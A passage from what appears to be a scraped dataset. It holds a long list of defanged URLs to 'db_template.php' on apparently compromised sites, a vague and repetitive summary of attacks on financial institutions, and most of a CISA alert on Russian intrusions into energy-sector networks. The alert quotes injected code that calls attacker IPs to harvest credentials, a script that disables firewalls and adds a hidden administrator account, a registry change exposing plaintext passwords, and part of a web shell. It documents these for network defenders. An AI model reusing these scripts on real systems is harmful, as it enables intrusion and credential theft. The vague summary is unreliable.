_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com/includes/db_template.phphxxp://arbruisseau[.]com/profiles/db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all-reseller[.]com/zzz_backup/db_template.phphxxp://alcatrazmoon[.]com/images/db_template.phphxxp://www.alcalumni[.]com/wp-includes/db_template.phphxxp://aniljoseph[.]com/servermon/db_template.phphxxp://alwake3press[.]com/wp-includes/db_template.phphxxp://www.hfhl[.]org.ls/habitat/db_template.phphxxp://alcafricanos[.]com/slsmonographs/db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org/en/db_template.phphxxps://ancient-wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk/font-awesome/db_template.phphxxp://geetransfers[.]co.za/font-awesome/db_template.phphxxp://carlagrobler[.]co.za/components/db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za/video/db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz/kitzz/db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za/nweb2/db_template.phphxxp://chrishanicdc[.]org/wpimages/db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia-equip[.]co[.]uk//db_template.phphxxp://always-beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com/wp-admin/db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew-snyder[.]net/bootstrap/db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta-armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za/images/db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor-clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com/wp-includes/db_template.phphxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://alissanicolai[.]com/assets/db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za/php/db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za/trendy1/db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com/wp-admin/db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com/tmp/db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com/admin/db_template.phphxxps://allusdoctors[.]com/themes/db_template.phphxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.phphxxp://itengineering[.]co.za/gatewaydiamond/db_template.phphxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net/wp-includes/db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc-sec[.]net//db_template.phphxxp://ldams[.]org.ls/supplies/db_template.phphxxp://menaboracks[.]co.za/tmp/db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za/templates/db_template.phphxxp://fccorp[.]co.za/php/db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws-gov[.]co.za//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com/widgetstyles/db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com/wp-includes/db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com/admin/db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com/wpimages/db_template.phphxxp://glgroup[.]co.za/images/db_template.phphxxp://hisandherskennels[.]co.za/php/db_template.phphxxp://alemaohost[.]com/lotosorg[.]com/db_template.phphxxp://isibaniedu[.]co.za/admin/db_template.phphxxp://dianakleyn[.]co.za/layouts/db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za/js/db_template.phphxxp://highschoolsuperstar[.]co.za/files/db_template.phphxxp://www.ambientproperty[.]com//db_template.phphxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za/font-awesome/db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za/css/db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com/wp-includes/db_template.phphxxp://allisonplumbing[.]com/wp-includes/db_template.phphxxp://eastrandmotorlab[.]co.za/fleet/db_template.phphxxp://angelsongroup[.]com/wp-includes/db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb-racing[.]co.za/htdocs/db_template.phphxxp://anotherpartofme[.]com/wp-includes/db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc-u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk/shopping/db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com/wp-includes/db_template.phphxxp://colenesphotography[.]co.za/modules/db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com/thumbs/db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es/storefront/db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za/js/db_template.phphxxp://promechtransport[.]co.za/scripts/db_template.phphxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com/gallonature/db_template.phphxxp://oftheearthphotography[.]com/www/db_template.phphxxp://h-dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com/downloads/db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com/email_template/db_template.phphxxp://funisalodge[.]co.za/data1/db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs-consult[.]com//db_template.phphxxp://www.animationinisrael[.]org/tmp_images/db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za/photography/db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.phphxxp://almeriahotelja[.]com/dk/db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com/assets/db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com/leadership/db_template.phphxxps://ahelicoptermom[.]com/wp-includes/db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com/wp-admin/db_template.phphxxp://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za/test/db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phphxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org/wp-admin/db_template.phphxxp://www.alexandrasternin[.]com/illustration/db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za/assets/db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek-intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.phphxxp://alorabrownies[.]com/wp-admin/db_template.phphxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.phphxxp://cazochem[.]co.za/cazochem/db_template.phphxxp://debnoch[.]com/image/db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz/admin/db_template.phphxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://insta-art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com/uploads/db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.phphxxp://amruthavana[.]com/blog/db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za/wpimages/db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za/images/db_template.phphxxps://www.apliety[.]co.il/wp-includes/db_template.phphxxp://alchamelup[.]org/htdocs/db_template.phphxxp://benonicoc[.]co.za/resources/db_template.phphxxps://al-mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phphxxp://alphabee.fund/PHPMailer_5.2.0/db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com/wp-includes/db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls/modules/db_template.phphxxp://apironco[.]com/wp-includes/db_template.phphxxp://digital-cameras-south-africa[.]co.za/script/db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl/next/db_template.phphxxp://juniorad[.]co.za/vendor/db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com/allaccess/db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phphxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za/less/db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com/wp1/db_template.phphxxp://anet-international-group[.]com/shop/db_template.phphxxp://courtesydriving[.]co.za/js/db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma-law[.]co.za//db_template.phphxxp://amari[.]ro/components/db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com/wp/wp-includes/db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com/dnsarabia[.]com/db_template.phphxxp://airesis.blog/wp-admin/db_template.phphxxp://www.aptibet[.]org//db_template.phphxxp://alecattic[.]com/wp-includes/db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za/wpscripts/db_template.phphxxp://www";A group of attackers targeted financial institutions using spear-phishing and code injection during the past month. They used obfuscated JavaScript and Windows 7 and above PowerShell scripts. The attacks targeted Windows 7 and above users on Microsoft Windows, and users should keep their systems and security up to date to avoid attacks. The attackers used obfuscated code and encryption to hide PowerShell scripts and SCT files. Users should avoid suspicious activities and report any unusual activities. The attackers used obfuscated code injection from a Defender.sct file. Attackers abuse PowerStats macro-documents and PowerShell scripts for lateral movement and code injection. Users should use two-factor authentication, be suspicious of unexpected activities, and report unusual activities. The attackers use obfuscation techniques to remain hidden, so users should keep systems and security up to date, enable two-factor authentication, be suspicious of unexpected activities, and report unexpected activities. Other security measures such as patching and two-factor authentication also help.;en;
https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical;Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors;"Systems AffectedDomain ControllersFile ServersEmail ServersOverviewThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on Russian government actions targeting U.S. Government entities as well as organizations in the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors. It also contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by Russian government cyber actors on compromised victim networks. DHS and FBI produced this alert to educate network defenders to enhance their ability to identify and reduce exposure to malicious activity.DHS and FBI characterize this activity as a multi-stage intrusion campaign by Russian government cyber actors who targeted small commercial facilities’ networks where they staged malware, conducted spear phishing, and gained remote access into energy sector networks. After obtaining access, the Russian government cyber actors conducted network reconnaissance, moved laterally, and collected information pertaining to Industrial Control Systems (ICS).For a downloadable copy of IOC packages and associated files, see:Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.Since at least March 2016, Russian government cyber actors—hereafter referred to as “threat actors”—targeted government entities and multiple U.S. critical infrastructure sectors, including the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors.Analysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors related to this activity. Of note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. [1]This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third-party suppliers with less secure networks, referred to as “staging targets” throughout this alert. The threat actors used the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. NCCIC and FBI judge the ultimate objective of the actors is to compromise organizational networks, also referred to as the “intended target.”Technical DetailsThe threat actors in this campaign employed a variety of TTPs, includingspear-phishing emails (from compromised legitimate account),watering-hole domains,credential gathering,open-source and network reconnaissance,host-based exploitation, andtargeting industrial control system (ICS) infrastructure.Using Cyber Kill Chain for AnalysisDHS used the Lockheed-Martin Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of threat actors’ activities within this framework.Stage 1: ReconnaissanceThe threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. DHS analysis identified the threat actors accessing publicly available information hosted by organization-monitored networks during the reconnaissance phase. Based on forensic analysis, DHS assesses the threat actors sought information on network and organizational design and control system capabilities within organizations. These tactics are commonly used to collect the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publicly accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.Analysis also revealed that the threat actors used compromised staging targets to download the source code for several intended targets’ websites. Additionally, the threat actors attempted to remotely access infrastructure such as corporate web-based email and virtual private network (VPN) connections.Stage 2: WeaponizationSpear-Phishing Email TTPsThroughout the spear-phishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//<remote IP address>/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.) After obtaining a credential hash, the threat actors can use password-cracking techniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use single-factor authentication. [2]Use of Watering Hole DomainsOne of the threat actors’ primary uses for staging targets was to develop watering holes. Threat actors compromised the infrastructure of trusted organizations to reach intended targets. [3] Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and reference malicious content. The threat actors used legitimate credentials to access and directly modify the website content. The threat actors modified these websites by altering JavaScript and PHP files to request a file icon using SMB from an IP address controlled by the threat actors. This request accomplishes a similar technique observed in the spear-phishing documents for credential harvesting. In one instance, the threat actors added a line of code into the file “header.php”, a legitimate PHP file that carried out the redirected traffic.<img src=""file[:]//62.8.193[.]206/main_logo.png"" style=""height: 1px; width: 1px;"" />In another instance, the threat actors modified the JavaScript file, “modernizr.js”, a legitimate JavaScript library used by the website to detect various aspects of the user’s browser. The file was modified to contain the contents below:var i = document.createElement(""img""); i.src = ""file[:]//184.154.150[.]66/ame_icon.png""; i.width = 3; i.height=2;Stage 3: DeliveryWhen compromising staging target networks, the threat actors used spear-phishing emails that differed from previously reported TTPs. The spear-phishing emails used a generic contract agreement theme (with the subject line “AGREEMENT & Confidential”) and contained a generic PDF document titled ``document.pdf. (Note the inclusion of two single back ticks at the beginning of the attachment name.) The PDF was not malicious and did not contain any active code. The document contained a shortened URL that, when clicked, led users to a website that prompted the user for email address and password. (Note: no code within the PDF initiated a download.)In previous reporting, DHS and FBI noted that all of these spear-phishing emails referred to control systems or process control systems. The threat actors continued using these themes specifically against intended target organizations. Email messages included references to common industrial control equipment and protocols. The emails used malicious Microsoft Word attachments that appeared to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, and invitations and policy documents to entice the user to open the attachment.Stage 4: ExploitationThe threat actors used distinct and unusual TTPs in the phishing campaign directed at staging targets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link, which redirected to http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained input fields for an email address and password mimicking a login page for a website.When exploiting the intended targets, the threat actors used malicious .docx files to capture user credentials. The documents retrieved a file through a “file://” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139. This connection is made to a command and control (C2) server—either a server owned by the threat actors or that of a victim. When a user attempted to authenticate to the domain, the C2 server was provided with the hash of the password. Local users received a graphical user interface (GUI) prompt to enter a username and password, and the C2 received this information over TCP ports 445 or 139. (Note: a file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. [1]Stage 5: InstallationThe threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication was not used. [4] To maintain persistence, the threat actors created local administrator accounts within staging targets and placed malicious files within intended targets.Establishing Local AccountsThe threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script “symantec_help.jsp” contained a one-line reference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in “C:\Program Files (x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\webapps\ROOT\”.Contents of symantec_help.jsp____________________________________________________________________________________________________________________<% Runtime.getRuntime().exec(""cmd /C \"""" + System.getProperty(""user.dir"") + ""\\..\\webapps\\ROOT\\<enu.cmd>\""""); %>____________________________________________________________________________________________________________________The script “enu.cmd” created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group to gain elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.Contents of enu.cmd____________________________________________________________________________________________________________________netsh firewall set opmode disablenetsh advfirewall set allprofiles state offreg add ""HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"" /v 3389:TCP /t REG_SZ /d ""3389:TCP:*:Enabled:Remote Desktop"" /freg add ""HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\GloballyOpenPorts\List"" /v 3389:TCP /t REG_SZ /d ""3389:TCP:*:Enabled:Remote Desktop"" /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core"" /v EnableConcurrentSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v EnableConcurrentSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"" /v MaxInstanceCount /t REG_DWORD /d 100 /fnet user MS_BACKUP <Redacted_Password> /addnet localgroup Administrators /add MS_BACKUPnet localgroup Administradores /add MS_BACKUPnet localgroup Amministratori /add MS_BACKUPnet localgroup Administratoren /add MS_BACKUPnet localgroup Administrateurs /add MS_BACKUPnet localgroup ""Remote Desktop Users"" /add MS_BACKUPnet user MS_BACKUP /expires:neverreg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"" /v MS_BACKUP /t REG_DWORD /d 0 /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fsc config termservice start= autonet start termservice____________________________________________________________________________________________________________________DHS observed the threat actors using this and similar scripts to create multiple accounts within staging target networks. Each account created by the threat actors served a specific purpose in their operation. These purposes ranged from the creation of additional accounts to cleanup of activity. DHS and FBI observed the following actions taken after the creation of these local accounts:Account 1: Account 1 was named to mimic backup services of the staging target. This account was created by the malicious script described earlier. The threat actor used this account to conduct open-source reconnaissance and remotely access intended targets.Account 2: Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.Account 3: Account 3 was created within the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).Account 4: In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete logs and cover tracks.Scheduled TaskIn addition, the threat actors created a scheduled task named reset, which was designed to automatically log out of their newly created account every eight hours.VPN SoftwareAfter achieving access to staging targets, the threat actors installed tools to carry out operations against intended victims. On one occasion, threat actors installed the free version of FortiClient, which they presumably used as a VPN client to connect to intended target networks.Password Cracking ToolsConsistent with the perceived goal of credential harvesting, the threat actors dropped and executed open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the actor was accessing the system. Of note, the threat actors installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\Users\<Redacted Username>\Desktop\OWAExchange\.DownloaderOnce inside of an intended target’s network, the threat actor downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.The files were renamed to new extensions, with INST.txt being renamed INST.exe.The files were executed on the host and then immediately deleted.The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of the compromised system of an intended target.The registry value “ntdll” was added to the “HKEY_USERS\<USER SID>\Software\Microsoft\Windows\CurrentVersion\Run” key.Persistence Through .LNK File ManipulationThe threat actors manipulated LNK files, commonly known as a Microsoft Window’s shortcut file, to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection.Four of the observed LNK files were “SETROUTE.lnk”, “notepad.exe.lnk”, “Document.lnk” and “desktop.ini.lnk”. These names appeared to be contextual, and the threat actor may use a variety of other file names while using this tactic. Two of the remote servers observed in the icon path of these LNK files were 62.8.193[.]206 and 5.153.58[.]45. Below is the parsed content of one of the LNK files:Parsed output for file: desktop.ini.lnkRegistry ModificationThe threat actor would modify key systems to store plaintext credentials in memory. In one instance, the threat actor executed the following command.reg add ""HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"" /v UseLogonCredential /t REG_DWORD /d 1 /fStage 6: Command and ControlThe threat actors commonly created web shells on the intended targets’ publicly accessible email and web servers. The threat actors used three different filenames (“global.aspx, autodiscover.aspx and index.aspx) for two different webshells. The difference between the two groups was the “public string Password” field.Beginning Contents of the Web Shell____________________________________________________________________________________________________________________<%@ Page Language=""C#"" Debug=""true"" trace=""false"" validateRequest=""false"" EnableViewStateMac=""false"" EnableViewState=""true""%><%@ import Namespace=""System""%><%@ import Namespace=""System.IO""%><%@ import Namespace=""System.Diagnostics""%><%@ import Namespace=""System.Data""%><%@ import Namespace=""System.Management""%><%@ import Namespace=""System.Data.OleDb""%><%@ import Namespace=""Microsoft.Win32""%><%@ import Namespace=""System.Net.Sockets"" %><%@ import Namespace=""System.Net"" %><%@ import Namespace=""System.Runtime.InteropServices""%><%@ import Namespace=""System.DirectoryServices""%><%@ import Namespace=""System.ServiceProcess""%><%@ import Namespace=""System.Text.RegularExpressions""%><%@ Import Namespace=""System.Threading""%><%@ Import Namespace=""System.Data.SqlClient""%><%@ import Namespace=""Microsoft.VisualBasic""%><%@ Import Namespace=""System.IO.Compression"" %><%@ Assembly Name=""System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a""%><!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""><script runat = ""server"">public string Password = ""<REDACTED>"";public string z_progname = ""z_WebShell"";…____________________________________________________________________________________________________________________Stage 7: Actions on ObjectivesDHS and FBI identified the threat actors leveraging remote access services and infrastructure such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the infrastructure of staging targets to connect to several intended targets.Internal ReconnaissanceUpon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. DHS observed the threat actors focusing on identifying and browsing file servers within the intended victim’s network.Once on the intended target’s network, the threat actors used privileged credentials to access the victim’s domain controller typically via RDP. Once on the domain controller, the threat actors used the batch scripts “dc.bat” and “dit.bat” to enumerate hosts, users, and additional information about the environment. The observed outputs (text documents) from these scripts were:admins.txtcompleted_dclist.txtcompleted_trusts.txtcompleted_zone.txtcomps.txtconditional_forwarders.txtdomain_zone.txtenum_zones.txtusers.txtThe threat actors also collected the files “ntds.dit” and the “SYSTEM” registry hive. DHS observed the threat actors compress all of these files into archives named “SYSTEM.zip” and “comps.zip”.The threat actors used Windows’ scheduled task and batch scripts to execute “scr.exe” and collect additional information from hosts on the network. The tool “scr.exe” is a screenshot utility that the threat actor used to capture the screen of systems across the network. The MD5 hash of “scr.exe” matched the MD5 of ScreenUtil, as reported in the Symantec Dragonfly 2.0 report.In at least two instances, the threat actors used batch scripts labeled 